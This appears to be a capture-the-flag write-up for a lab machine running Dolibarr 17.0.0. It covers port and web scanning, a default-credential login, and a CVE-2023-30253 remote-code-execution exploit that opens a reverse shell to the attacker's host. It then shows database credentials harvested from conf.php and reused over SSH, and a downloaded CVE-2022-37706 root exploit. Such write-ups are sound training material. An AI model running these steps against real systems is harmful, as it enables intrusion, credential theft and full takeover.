## Target Information
- **IP Address**: 10.10.11.11

## Open Ports
An Nmap scan was conducted to identify open ports on the target machine.

```bash
$ nmap -sV 10.10.11.11
```

### Nmap Scan Results
```bash
Starting Nmap 7.94SVN (https://nmap.org) at 2024-09-19 14:54 BST
Nmap scan report for 10.10.11.11
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Vulnerability Scanning
A vulnerability scan was performed using Nikto to identify potential security issues.

```bash
$ nikto -host 10.10.11.11 -p 22,80
```

### Nikto Scan Results
```sh
- Nikto v2.5.0
+ Target IP:          10.10.11.11
+ Target Hostname:    10.10.11.11
+ Target Port:        80
+ Start Time:         2024-09-19 14:57:36 (GMT1)
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54).
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ 8050 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2024-09-19 15:02:03 (GMT1) (267 seconds)
```

### Identified Vulnerabilities
- Missing security headers (X-Frame-Options, X-Content-Type-Options)
- Outdated Apache version

## Directory Busting
Directory enumeration was performed using DIRB to discover hidden directories and files.

```
$ dirb http://10.10.11.11 "/usr/share/wordlists/dirb/common.txt"
```

### DIRB Scan Results
```bash
==> DIRECTORY: http://10.10.11.11/css/
==> DIRECTORY: http://10.10.11.11/images/
+ http://10.10.11.11/index.php (CODE:200|SIZE:15949)
==> DIRECTORY: http://10.10.11.11/js/
+ http://10.10.11.11/server-status (CODE:403|SIZE:276)
```

## Subdomain Enumeration
Fuzzing was conducted to identify subdomains associated with the target.

```bash
$ ffuf -w '/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt' -u http://board.htb/ -H "HOST: FUZZ.board.htb" -c -fs 15949
```

### Fuzzing Results
```bash
crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 63ms]
```

## Exploitation
The subdomain `crm.board.htb` was identified, leading to a login portal for Dolibarr version 17.0.0. 

### Authentication
Using the credentials `admin:admin`, access to the portal was successfully obtained.

### Vulnerability Identification
Research on Dolibarr 17.0.0 revealed the presence of **CVE-2023-30253**, which allows for remote code execution when authenticated.

### Exploit Execution
The exploit was downloaded and executed as follows:

```bash
$ python3 exploit.py http://crm.board.htb admin admin 10.10.14.133 9001
```

A reverse shell was established using the command:

```bash
$ nc -lvnp 9001
```

### File System Exploration
Upon gaining access, the `/home` directory was explored, revealing a directory named `larissa`, which was inaccessible due to permission restrictions. 

### Configuration File Discovery
The configuration file `conf.php` was located at `crm.board.htb/htdocs/conf`. The contents of the file provided critical information regarding the database configuration and authentication settings:

```php
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
```

### Database Access
Using the credentials extracted from the configuration file, access to the MySQL database was attempted:

```bash
$ mysql -u dolibarrowner -p
```

Upon successful authentication, the same credentials were used to establish an SSH connection to the target machine, allowing further exploration of the file system.

### User Flag Retrieval
After logging in via SSH, the user flag was located in the `user.txt` file:

```bash
User Flag: cc4868fcbf4bdd278e604885b2dc94c2
```

## Privilege Escalation
To escalate privileges, a search for setuid binaries was conducted:

```bash
$ find / -perm -u=s -type f 2>/dev/null
```

This search revealed the presence of a software package called **Enlightenment**, which was found to be affected by **CVE-2022-37706**.

### Exploit Execution for Privilege Escalation
An exploit for CVE-2022-37706 was downloaded from GitHub:

```bash
$ wget https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
```

The exploit was then transferred to the target machine's `/tmp/` directory using SCP:

```bash
$ scp exploit.sh larissa@10.10.11.11:/tmp/
```

After transferring the exploit, it was executed to gain root access:

```bash
$ chmod +x /tmp/exploit.sh
$ /tmp/exploit.sh
```

### Root Flag Retrieval
Upon successful execution of the exploit, root access was obtained. The root flag was located in the root directory:

```bash
Root Flag: ee4f5ede56377b48f5554ca143d3175b
```

## Conclusion
This CTF challenge involved multiple stages, including reconnaissance, vulnerability scanning, exploitation, and privilege escalation. The successful retrieval of both the user and root flags demonstrates the effectiveness of the identified vulnerabilities and the execution of the corresponding exploits. 

### Flags Summary
- **User Flag**: `cc4868fcbf4bdd278e604885b2dc94c2`
- **Root Flag**: `ee4f5ede56377b48f5554ca143d3175b`

This write-up serves as a comprehensive overview of the methodologies and techniques employed during the engagement with the target system.